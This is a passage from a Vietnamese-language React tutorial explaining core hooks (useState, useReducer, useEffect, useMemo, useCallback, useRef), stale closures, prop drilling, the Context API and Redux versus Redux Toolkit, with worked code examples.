So với bản "chưa custom" ở trên: nếu giờ cần thêm debounce, bạn chỉ sửa **đúng một chỗ** — bên trong `useWindowWidth` — và cả `Sidebar` lẫn `Header` đều tự động được hưởng thay đổi đó mà không cần đụng vào code của chúng.

Class Component vẫn được React hỗ trợ, nhưng Hooks đã là chuẩn mực trong code React hiện đại.

---

## 6. Các Hook Cốt Lõi

### 6.1. `useState` và `useReducer` — quản lý trạng thái

`useState` tạo một "vùng nhớ" riêng cho component, được React giữ lại xuyên suốt các lần render:

```jsx
const [count, setCount] = useState(0);
```

**Bẫy phổ biến với người mới — cập nhật dựa trên giá trị cũ:**

```jsx
// SAI trong một số trường hợp — dễ dính bug khi gọi nhiều lần liên tiếp
function handleClick() {
  setCount(count + 1);
  setCount(count + 1);
  setCount(count + 1);
}
// Kết quả: count chỉ tăng 1, KHÔNG phải 3!
```

Lý do: React **gom nhiều lệnh `setState` liên tiếp lại thành một lần render** (gọi là batching) để tối ưu hiệu năng. Cả 3 lời gọi `setCount(count + 1)` ở trên đều dùng chung giá trị `count` cũ (chưa kịp cập nhật) tại thời điểm hàm `handleClick` được tạo ra, nên cả 3 đều tính ra cùng một kết quả.

```jsx
// ĐÚNG — dùng dạng hàm (functional update) để luôn lấy giá trị mới nhất
function handleClick() {
  setCount(prev => prev + 1);
  setCount(prev => prev + 1);
  setCount(prev => prev + 1);
}
// Kết quả: count tăng đúng 3, vì mỗi lần React đưa "prev" mới nhất vào hàm
```

**Khi nào dùng `useReducer` thay vì `useState`:** khi state có nhiều nhánh logic liên quan với nhau (ví dụ một form phức tạp với nhiều field, hoặc trạng thái loading/success/error của 1 request).

**Nếu vẫn cố dùng `useState` cho trường hợp này — ví dụ quản lý trạng thái gọi API:**

```jsx
function UserProfile({ userId }) {
  // Phải khai báo RIÊNG LẺ từng mảnh state liên quan đến CÙNG một việc (gọi API)
  const [data, setData] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState(null);

  useEffect(() => {
    setIsLoading(true);
    setError(null);

    fetch(`/api/users/${userId}`)
      .then(res => res.json())
      .then(json => {
        setData(json);       // set 1: thành công
        setIsLoading(false); // set 2: phải nhớ tắt loading
      })
      .catch(err => {
        setError(err);       // set 1: lỗi
        setIsLoading(false); // set 2: cũng phải nhớ tắt loading ở NHÁNH KHÁC
      });
  }, [userId]);

  if (isLoading) return <p>Đang tải...</p>;
  if (error) return <p>Lỗi: {error.message}</p>;
  return <div>{data.name}</div>;
}
```

**Vấn đề cụ thể của cách làm này:**

1. **3 lệnh `set` rời rạc cho CÙNG một khái niệm "trạng thái request".** Về bản chất, `data`, `isLoading`, `error` luôn phải đồng bộ với nhau (ví dụ: khi đang loading thì `error` phải là `null`, khi có `error` thì `isLoading` phải là `false`) — nhưng `useState` không có cơ chế nào ép buộc điều đó. Rất dễ viết thiếu 1 dòng `setIsLoading(false)` ở một nhánh nào đó, khiến UI kẹt mãi ở trạng thái "Đang tải..." dù request đã xong từ lâu.
2. **Không có "một nơi duy nhất" để xem toàn bộ các trạng thái hợp lệ có thể xảy ra.** Với `useState` rời rạc, để biết "app có thể ở những trạng thái nào" bạn phải đọc lướt toàn bộ component để tự suy luận, thay vì có ngay một danh sách rõ ràng.
3. **Khó tái sử dụng logic giống hệt ở component khác** — mỗi nơi cần gọi API tương tự lại phải khai báo lại `data`/`isLoading`/`error` và lặp lại đúng những lỗi tiềm ẩn ở trên.

**Viết lại bằng `useReducer` — gom mọi nhánh logic vào một hàm duy nhất:**

```jsx
function reducer(state, action) {
  switch (action.type) {
    case 'FETCH_START':
      return { data: null, isLoading: true, error: null };
    case 'FETCH_SUCCESS':
      return { data: action.payload, isLoading: false, error: null };
    case 'FETCH_ERROR':
      return { data: null, isLoading: false, error: action.payload };
    default:
      throw new Error('Unknown action');
  }
}

function UserProfile({ userId }) {
  const [state, dispatch] = useReducer(reducer, {
    data: null, isLoading: false, error: null
  });

  useEffect(() => {
    dispatch({ type: 'FETCH_START' });
    fetch(`/api/users/${userId}`)
      .then(res => res.json())
      .then(json => dispatch({ type: 'FETCH_SUCCESS', payload: json }))
      .catch(err => dispatch({ type: 'FETCH_ERROR', payload: err }));
  }, [userId]);

  if (state.isLoading) return <p>Đang tải...</p>;
  if (state.error) return <p>Lỗi: {state.error.message}</p>;
  return <div>{state.data.name}</div>;
}
```

**Vì sao bản này tốt hơn:** mỗi nhánh (`FETCH_START`, `FETCH_SUCCESS`, `FETCH_ERROR`) trả về **toàn bộ một object state hợp lệ trong một lần** — không có chuyện quên set `isLoading` ở một nhánh nào đó, vì mỗi `case` trong `reducer` tự chịu trách nhiệm mô tả đầy đủ cả 3 trường cùng lúc. Toàn bộ "các trạng thái có thể xảy ra" nằm gọn trong một hàm `reducer` duy nhất, dễ đọc lướt qua để nắm hết logic, và nếu muốn tái sử dụng, bạn chỉ cần đóng gói cả `reducer` + `useReducer` này vào một custom hook (như `useFetch(url)`) dùng lại ở nhiều nơi — kết hợp đúng ý tưởng custom hook đã nói ở phần 5.3.

**Ví dụ đơn giản hơn để nắm cú pháp cơ bản (counter):**

Thay vì gọi `setState` rải rác ở nhiều nơi, bạn mô tả các "hành động" (action) và gom logic xử lý vào một hàm `reducer` duy nhất:

```jsx
function reducer(state, action) {
  switch (action.type) {
    case 'increment':
      return { count: state.count + 1 };
    case 'decrement':
      return { count: state.count - 1 };
    default:
      throw new Error('Unknown action');
  }
}

function Counter() {
  const [state, dispatch] = useReducer(reducer, { count: 0 });
  return (
    <>
      <p>{state.count}</p>
      <button onClick={() => dispatch({ type: 'increment' })}>+</button>
      <button onClick={() => dispatch({ type: 'decrement' })}>-</button>
    </>
  );
}
```

### 6.2. `useEffect` — cầu nối với thế giới bên ngoài

```jsx
useEffect(() => {
  // side effect: gọi API, đăng ký sự kiện, thao tác DOM...
  return () => {
    // cleanup: chạy trước khi effect chạy lại, hoặc trước khi unmount
  };
}, [dependencies]);
```

**3 cách khai báo dependency và ý nghĩa khác nhau:**

```jsx
useEffect(() => { /* ... */ });          // chạy sau MỌI lần render
useEffect(() => { /* ... */ }, []);      // chỉ chạy 1 lần, sau lần mount đầu tiên
useEffect(() => { /* ... */ }, [userId]); // chạy lại mỗi khi userId đổi
```

**Ví dụ cụ thể fetch dữ liệu khi `userId` đổi:**

```jsx
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);

  useEffect(() => {
    let cancelled = false;

    fetch(`/api/users/${userId}`)
      .then(res => res.json())
      .then(data => {
        if (!cancelled) setUser(data); // tránh set state nếu component đã unmount
      });

    return () => { cancelled = true; }; // cleanup: đánh dấu hủy nếu userId đổi tiếp hoặc unmount
  }, [userId]);

  return user ? <div>{user.name}</div> : <div>Đang tải...</div>;
}
```

Nếu bạn quên đưa `userId` vào mảng dependency, effect sẽ luôn dùng giá trị `userId` **tại lần đầu tiên** component mount, dù prop `userId` đã đổi sau đó — dẫn đến hiển thị sai user. Đây chính là hiện tượng "stale closure" sẽ nói kỹ ở phần 6.3.

### 6.3. Stale Closure — lỗi kinh điển của người mới học Hooks

**Stale closure** xảy ra khi hàm bên trong `useEffect` (hoặc bất kỳ callback nào) "giữ lại" giá trị state tại **thời điểm nó được tạo ra**, và không tự cập nhật theo state mới dù state đã đổi.

```jsx
import { useState, useEffect } from "react";

function Counter() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const id = setInterval(() => {
      console.log(count);      // LUÔN in ra 0
      setCount(count + 1);     // LUÔN tính 0 + 1 = 1
    }, 1000);

    return () => clearInterval(id);
  }, []); // mảng rỗng — effect chỉ chạy 1 LẦN DUY NHẤT

  return <div>{count}</div>;
}
```

**Kết quả khi chạy:** `count` chỉ tăng lên 1 rồi đứng yên mãi mãi (không phải tăng đều mỗi giây), và `console.log` luôn in ra `0`.

**Giải thích cặn kẽ vì sao:** vì dependency array là `[]`, `useEffect` chỉ chạy **đúng một lần** ngay khi component mount — tại thời điểm đó, hàm callback bên trong `setInterval` được tạo ra và nó "đóng gói" (closure) giá trị `count` lúc đó, tức là `0`. Interval này chạy mãi mãi với **cùng một hàm callback đó** — nó không bao giờ được tạo lại, nên nó không bao giờ "biết" `count` đã đổi thành 1 ở lần sau. Mỗi giây nó vẫn tính `0 + 1 = 1` rồi gọi `setCount(1)` — React thấy giá trị mới (1) giống hệt giá trị đang lưu (đã là 1 từ lần đầu) nên không re-render nữa, và giá trị hiển thị đứng yên ở 1.

**Cách sửa 1 — functional update (đơn giản nhất):**

```jsx
useEffect(() => {
  const id = setInterval(() => {
    setCount(prev => prev + 1); // React luôn đưa giá trị MỚI NHẤT vào "prev", không phụ thuộc closure
  }, 1000);
  return () => clearInterval(id);
}, []);
```

Đây là lý do nguyên tắc "luôn ưu tiên dạng hàm khi cập nhật state dựa trên giá trị cũ" (đã nói ở 6.1) không chỉ là thói quen tốt — nó là cách sửa triệt để lỗi stale closure.

**Cách sửa 2 — dùng `useRef` khi cần đọc giá trị mới nhất mà không muốn effect chạy lại:**

```jsx
function Counter() {
  const [count, setCount] = useState(0);
  const countRef = useRef(count);
  countRef.current = count; // luôn đồng bộ ref với state mới nhất sau mỗi render

  useEffect(() => {
    const id = setInterval(() => {
      console.log(countRef.current); // luôn đọc đúng giá trị mới nhất
    }, 1000);
    return () => clearInterval(id);
  }, []);

  return <div>{count}</div>;
}
```

### 6.4. Tối ưu hiệu năng: `useMemo`, `useCallback`, `useRef`

Ba hook này không thay đổi *kết quả* của component, chỉ tối ưu *hiệu năng* — nên chỉ nên dùng khi thực sự đo được vấn đề, không nên áp dụng tràn lan (mỗi lần dùng đều có chi phí tính toán riêng để so sánh dependency).

**`useMemo` — ghi nhớ kết quả tính toán tốn kém:**

```jsx
function ProductList({ products, keyword }) {
  // Nếu KHÔNG dùng useMemo: mỗi lần ProductList render lại (ví dụ do component cha
  // re-render vì lý do khác, không liên quan đến products/keyword), hàm filter
  // 10.000 sản phẩm này vẫn chạy lại từ đầu — lãng phí.
  const filtered = useMemo(() => {
    return products.filter(p => p.name.includes(keyword));
  }, [products, keyword]); // chỉ tính lại khi products hoặc keyword đổi

  return <ul>{filtered.map(p => <li key={p.id}>{p.name}</li>)}</ul>;
}
```

**`useCallback` — giữ nguyên reference của hàm giữa các lần render:**

```jsx
function Parent() {
  const [count, setCount] = useState(0);

  // KHÔNG dùng useCallback: mỗi lần Parent render, handleClick là MỘT HÀM MỚI
  // (địa chỉ bộ nhớ khác), khiến <ExpensiveChild> — dù được React.memo bọc —
  // vẫn re-render vì "prop onClick đã đổi" (dù logic bên trong giống hệt).
  const handleClick = useCallback(() => {
    console.log('clicked');
  }, []); // reference ổn định, không đổi giữa các lần render

  return (
    <div>
      <p>{count}</p>
      <button onClick={() => setCount(count + 1)}>Tăng Parent</button>
      <ExpensiveChild onClick={handleClick} />
    </div>
  );
}

const ExpensiveChild = React.memo(function ExpensiveChild({ onClick }) {
  console.log('ExpensiveChild render'); // log này để kiểm chứng có re-render hay không
  return <button onClick={onClick}>Click con</button>;
});
```

**Cách tự kiểm chứng:** xóa `useCallback` đi (chỉ để `const handleClick = () => {...}` thường), mở Console, click nút "Tăng Parent" nhiều lần — bạn sẽ thấy dòng log `ExpensiveChild render` xuất hiện dù `ExpensiveChild` không hề liên quan đến `count`. Thêm lại `useCallback`, lặp lại thao tác — dòng log đó sẽ không xuất hiện nữa (chỉ log 1 lần lúc mount). Đây là cách trực quan nhất để "thấy" tác dụng thật của `useCallback`, thay vì chỉ tin vào lý thuyết.

**`useRef` — vùng nhớ thay đổi được nhưng không gây re-render:**

```jsx
function TextInputWithFocusButton() {
  const inputRef = useRef(null);

  const focusInput = () => {
    inputRef.current.focus(); // thao tác trực tiếp với DOM node thật
  };

  return (
    <>
      <input ref={inputRef} type="text" />
      <button onClick={focusInput}>Focus vào ô input</button>
    </>
  );
}
```

Khác biệt cốt lõi so với `useState`: đổi `inputRef.current` **không** khiến component render lại — hữu ích khi bạn cần lưu một giá trị "nội bộ" (như id của `setInterval`, giá trị đo thời gian trước đó...) mà việc thay đổi nó không cần phản ánh ngay lên UI.

---

## 7. Kiến Trúc Dữ Liệu Và Quản Lý State Toàn Cục

Quản lý một biến `count` trong 1 component là chuyện nhỏ. Nhưng khi dữ liệu (ví dụ thông tin user đăng nhập) cần dùng ở nhiều component nằm rải rác trong cây UI (Navbar, Sidebar, trang Profile...), bài toán tổ chức state trở nên phức tạp hơn nhiều.

### 7.1. Lifting State Up và vấn đề Prop Drilling

Cách cơ bản nhất: đưa state lên component cha chung gần nhất, rồi truyền xuống qua props ("lifting state up").

```jsx
function App() {
  const [user, setUser] = useState(null);
  return (
    <div>
      <Navbar user={user} />
      <MainContent user={user} />
    </div>
  );
}
```

Cách này hoạt động tốt ở quy mô nhỏ. Nhưng nếu `user` cần dùng ở một component nằm **sâu 5 tầng** bên dưới `MainContent`, bạn buộc phải truyền `user` qua props ở **cả 5 tầng trung gian** — dù các component trung gian đó (`Layout`, `Section`, `Panel`...) hoàn toàn không dùng đến `user`, chúng chỉ đóng vai trò "truyền hộ". Đây gọi là **prop drilling** — code trở nên rối, và mỗi lần thêm/sửa 1 field trong `user` bạn phải sửa type/prop ở tất cả các tầng trung gian.

```jsx
// Prop drilling: Layout và Section không dùng user, chỉ "truyền hộ"
<Layout user={user}>
  <Section user={user}>
    <Panel user={user}>
      <ProfileCard user={user} /> {/* chỉ có đây mới thực sự cần user */}
    </Panel>
  </Section>
</Layout>
```

### 7.2. Context API — chia sẻ dữ liệu không qua props

`createContext` tạo một "nguồn dữ liệu chung", `Provider` bao bọc phần cây cần chia sẻ, `useContext` cho phép bất kỳ component con nào (dù nằm sâu bao nhiêu tầng) đọc trực tiếp mà không cần nhận qua props trung gian:

```jsx
const UserContext = createContext(null);

function App() {
  const [user, setUser] = useState({ name: "An" });
  return (
    <UserContext.Provider value={user}>
      <Layout>
        <Section>
          <Panel>
            <ProfileCard /> {/* không cần nhận props user nữa */}
          </Panel>
        </Section>
      </Layout>
    </UserContext.Provider>
  );
}

function ProfileCard() {
  const user = useContext(UserContext); // đọc trực tiếp, bỏ qua mọi tầng trung gian
  return <div>Xin chào, {user.name}</div>;
}
```

**Giới hạn quan trọng cần biết:** khi giá trị trong `Provider` đổi, **mọi component** đang gọi `useContext` với context đó sẽ re-render — kể cả những component chỉ dùng một phần nhỏ của dữ liệu không hề đổi. Ví dụ nếu `UserContext` chứa cả `{ name, theme, notifications }` và chỉ `notifications` đổi liên tục (do có tin nhắn mới mỗi giây), thì mọi component chỉ hiển thị `name` (vốn không đổi) vẫn bị ép re-render theo. Vì vậy Context phù hợp với dữ liệu **ít thay đổi** (theme, ngôn ngữ, thông tin đăng nhập), không phù hợp với dữ liệu cập nhật liên tục.

### 7.3. Redux và Redux Toolkit — khi Context không còn đủ

Khi ứng dụng có nhiều luồng dữ liệu phức tạp, nhiều nơi cùng cần sửa state theo các quy tắc rõ ràng, Redux cung cấp một kiến trúc chặt chẽ hơn: toàn bộ state nằm trong **một store duy nhất**, mọi thay đổi phải đi qua **action** → được xử lý bởi **reducer** → sinh ra state mới. Không có chuyện "sửa trực tiếp state ở bất kỳ đâu" như với biến thường.

**Ví dụ cụ thể về vấn đề mà Redux giải quyết — giỏ hàng (cart) trong app thương mại điện tử**

Giả sử `cart` cần được đọc và sửa từ nhiều nơi khác nhau trong app: `ProductCard` (nút "Thêm vào giỏ"), `Navbar` (icon giỏ hàng hiện số lượng), `CartPage` (danh sách + nút xóa), `CheckoutSummary` (tính tổng tiền). Nếu chỉ dùng Context với state để tự do sửa (không có quy tắc ràng buộc):

```jsx
const CartContext = createContext(null);

function ProductCard({ product }) {
  const { cart, setCart } = useContext(CartContext);

  const addToCart = () => {
    // Component A tự ý sửa state theo cách của riêng nó
    setCart([...cart, product]);
  };
  return <button onClick={addToCart}>Thêm vào giỏ</button>;
}

function CartPage() {
  const { cart, setCart } = useContext(CartContext);

  const removeItem = (id) => {
    // Component B lại tự sửa theo MỘT LOGIC KHÁC
    setCart(cart.filter(item => item.id !== id));
  };

  const applyDiscount = () => {
    // Component C sửa trực tiếp field bên trong từng item — quên clone đúng cách
    cart.forEach(item => { item.price = item.price * 0.9; }); // MUTATE TRỰC TIẾP!
    setCart(cart); // React có thể KHÔNG re-render vì reference của cart không đổi
  };

  return <div>{/* ... */}</div>;
}
```

**Vấn đề cụ thể xảy ra trong thực tế với cách làm này:**

1. **Mỗi nơi tự viết một cách sửa `cart` riêng**, không ai đảm bảo các cách đó nhất quán với nhau. `ProductCard` thêm bằng spread `[...cart, product]` (đúng), nhưng `applyDiscount` trong `CartPage` lại lỡ tay mutate trực tiếp từng `item.price` — React không phát hiện ra sự thay đổi (vì reference mảng `cart` không đổi), nên UI **không re-render**, hiển thị giá cũ dù dữ liệu bên trong đã đổi. Đây là loại bug rất khó tìm vì code "trông như chạy đúng logic".
2. **Không có nơi nào ghi lại "chuyện gì vừa xảy ra".** Khi tổng tiền ở `CheckoutSummary` sai, bạn phải dò từng component có quyền sửa `cart` (ở ví dụ này là 3 nơi, thực tế có thể là 15-20 nơi) để tìm xem ai đã sửa sai — không có lịch sử, không có cách nào "tua lại" để xem state đã đổi qua từng bước ra sao.
3. **Không thể chèn logic chung dễ dàng.** Nếu sau này bạn muốn: mỗi lần giỏ hàng đổi thì tự động lưu vào `localStorage`, hoặc log lại để phân tích hành vi người dùng — bạn phải sửa **ở tất cả các nơi** đang gọi `setCart`, dễ sót.

**Redux giải quyết bằng cách ép buộc: muốn sửa `cart`, chỉ có một cửa duy nhất — dispatch action, reducer xử lý:**

```jsx
// cartSlice.js
import { createSlice } from '@reduxjs/toolkit';

const cartSlice = createSlice({
  name: 'cart',
  initialState: { items: [] },
  reducers: {
    addItem(state, action) {
      state.items.push(action.payload); // Immer tự đảm bảo immutable phía sau
    },
    removeItem(state, action) {
      state.items = state.items.filter(item => item.id !== action.payload);
    },
    applyDiscount(state, action) {
      // CHỈ CÓ MỘT NƠI DUY NHẤT được phép sửa giá — không ai khác có thể tự ý mutate
      state.items.forEach(item => { item.price *= (1 - action.payload); });
    },
  },
});

export const { addItem, removeItem, applyDiscount } = cartSlice.actions;
export default cartSlice.reducer;
```

```jsx
// Ở bất kỳ component nào — chỉ được YÊU CẦU thay đổi qua dispatch, không tự sửa
function ProductCard({ product }) {
  const dispatch = useDispatch();
  return <button onClick={() => dispatch(addItem(product))}>Thêm vào giỏ</button>;
}

function CartPage() {
  const dispatch = useDispatch();
  const items = useSelector(state => state.cart.items); // chỉ ĐỌC, không sửa trực tiếp
  return (
    <div>
      {items.map(item => (
        <div key={item.id}>
          {item.name} — {item.price}
          <button onClick={() => dispatch(removeItem(item.id))}>Xóa</button>
        </div>
      ))}
    </div>
  );
}
```

**Vì sao cách này giải quyết đúng 3 vấn đề nêu trên:**

1. **Mọi thay đổi đều đi qua đúng một hàm `reducer`** — không component nào có thể tự ý mutate `cart` theo cách riêng của nó (component chỉ có quyền `dispatch`, không có quyền sửa state trực tiếp), nên logic sửa giá luôn nhất quán ở một chỗ.
2. **Có lịch sử đầy đủ để debug.** Mở Redux DevTools, bạn thấy được chính xác chuỗi action đã xảy ra theo thời gian (`addItem` → `addItem` → `applyDiscount` → `removeItem`...) và state tương ứng sau mỗi bước — thay vì phải đoán mò xem component nào đã sửa sai.
3. **Dễ chèn logic chung ở một điểm.** Muốn tự động lưu `localStorage` mỗi khi `cart` đổi, bạn chỉ cần thêm 1 middleware lắng nghe mọi action liên quan đến `cart`, không cần sửa lại từng component đang gọi `dispatch`.

**Redux Toolkit (RTK)** là bản viết gọn, chuẩn hóa của Redux truyền thống. Để thấy rõ "gọn hơn" cụ thể là gọn ở đâu, hãy viết **cùng một ví dụ giỏ hàng ở trên** bằng cả 2 cách, đặt cạnh nhau so sánh.

**Cách 1 — Redux truyền thống (không dùng RTK):**

```jsx
// actionTypes.js — phải tự định nghĩa từng loại action bằng tay
const ADD_ITEM = 'cart/ADD_ITEM';
const REMOVE_ITEM = 'cart/REMOVE_ITEM';
const APPLY_DISCOUNT = 'cart/APPLY_DISCOUNT';

// actions.js — phải tự viết từng action creator bằng tay
export const addItem = (product) => ({ type: ADD_ITEM, payload: product });
export const removeItem = (id) => ({ type: REMOVE_ITEM, payload: id });
export const applyDiscount = (percent) => ({ type: APPLY_DISCOUNT, payload: percent });

// cartReducer.js — PHẢI tự tay viết immutable update, Redux gốc KHÔNG tự làm giúp
function cartReducer(state = { items: [] }, action) {
  switch (action.type) {
    case ADD_ITEM:
      return { ...state, items: [...state.items, action.payload] };
    case REMOVE_ITEM:
      return {
        ...state,
        items: state.items.filter(item => item.id !== action.payload)
      };
    case APPLY_DISCOUNT:
      // Không được viết item.price *= ... như RTK — phải tự spread từng item
      return {
        ...state,
        items: state.items.map(item => ({
          ...item,
          price: item.price * (1 - action.payload)
        }))
      };
    default:
      return state;
  }
}

export default cartReducer;
```

```jsx
// store.js
import { createStore } from 'redux';
import cartReducer from './cartReducer';

const store = createStore(cartReducer);
```

Đếm thử: **3 file, ~35 dòng**, chỉ để định nghĩa 3 action đơn giản cho `cart`. Đặc biệt ở nhánh `APPLY_DISCOUNT`, bạn buộc phải tự tay spread (`{ ...item, price: ... }`) cho **từng item trong mảng** — quên spread đúng 1 chỗ (ví dụ lỡ viết `item.price = ...` trực tiếp như ví dụ lỗi ở phần "trước Redux") là lại quay về đúng bug ban đầu mà Redux vốn muốn ngăn chặn.

**Cách 2 — Redux Toolkit (RTK), cùng đúng logic đó:**

```jsx
// cartSlice.js
import { createSlice } from '@reduxjs/toolkit';

const cartSlice = createSlice({
  name: 'cart',
  initialState: { items: [] },
  reducers: {
    addItem(state, action) {
      state.items.push(action.payload); // không cần spread — Immer tự lo
    },
    removeItem(state, action) {
      state.items = state.items.filter(item => item.id !== action.payload);
    },
    applyDiscount(state, action) {
      // Viết như mutate trực tiếp, nhưng vẫn AN TOÀN nhờ Immer phía sau
      state.items.forEach(item => { item.price *= (1 - action.payload); });
    },
  },
});

export const { addItem, removeItem, applyDiscount } = cartSlice.actions;
export default cartSlice.reducer;
```

```jsx
// store.js
import { configureStore } from '@reduxjs/toolkit';
import cartReducer from './cartSlice';

export const store = configureStore({
  reducer: { cart: cartReducer },
});
```

**So sánh trực tiếp 2 cách viết cùng một logic:**

| Tiêu chí | Redux truyền thống | Redux Toolkit |
|---|---|---|
| Số file cần tách riêng | 3 (action types, action creators, reducer) | 1 (`createSlice` gom cả 3) |
| Định nghĩa action type | Phải tự đặt hằng số string (`'cart/ADD_ITEM'`) | Tự sinh từ `name` + tên method, không cần khai báo tay |
| Viết action creator | Phải tự viết hàm trả về `{ type, payload }` | Tự sinh từ tên method trong `reducers` |
| Cập nhật state lồng nhau (`applyDiscount`) | Phải tự spread thủ công từng cấp, dễ sai sót | Viết như mutate trực tiếp, Immer tự đảm bảo immutable |
| Cấu hình store | `createStore(reducer)` | `configureStore({ reducer })`, kèm sẵn Redux DevTools và một số middleware mặc định |

**Điểm quan trọng cần hiểu đúng ở bản RTK:** dòng `state.items.push(...)` hay `item.price *= ...` trông như đang mutate (sửa trực tiếp) state — điều mà Redux gốc vốn cấm kỵ (đúng như bug ở ví dụ "trước Redux" phần 7.3 phía trên). Nhưng RTK dùng thư viện **Immer** ở phía sau: nó cho phép bạn *viết* code như đang mutate trực tiếp (dễ đọc, ít lỗi thao tác spread sai cấp), nhưng Immer sẽ tự động tạo ra một **bản sao mới immutable** phía sau hậu trường — bạn được lợi cả về cú pháp gọn lẫn tính đúng đắn, mà không cần tự nhớ quy tắc "luôn spread" như bản Redux truyền thống.



```jsx
export const fetchUser = createAsyncThunk(
  'auth/fetchUser',
  async (id) => {
    const res = await fetch(`/api/users/${id}`);
    return res.json();
  }
);
```

Thay vì bạn phải tự viết `try/catch` và tự set 3 biến `isLoading`, `error`, `data` rời rạc ở mỗi nơi gọi API, `createAsyncThunk` tự động dispatch các action tương ứng với 3 trạng thái đó, giúp bạn xử lý UI (hiển thị spinner, thông báo lỗi, dữ liệu) một cách nhất quán trong `extraReducers` mà không lặp lại logic ở nhiều chỗ.

---

## Tổng kết: sợi chỉ xuyên suốt

Nếu nhìn lại toàn bộ tài liệu, mọi khái niệm đều bám theo 3 động lực nêu ở phần 1: **an toàn** (JSX escape mặc định, `$$typeof` chống giả mạo), **hiệu năng** (Virtual DOM, diffing heuristic, Fiber, `useMemo`/`useCallback`), và **khả năng bảo trì khi mở rộng** (component hóa, one-way data flow, Hooks gom logic theo tính năng, Context/Redux giải quyết prop drilling). Hiểu đúng "vì sao" ở mỗi lớp sẽ giúp bạn không chỉ nhớ API, mà còn tự suy luận ra cách dùng đúng khi gặp tình huống mới không có trong tài liệu này.

Giờ thì làm dự án thôi! 🚀
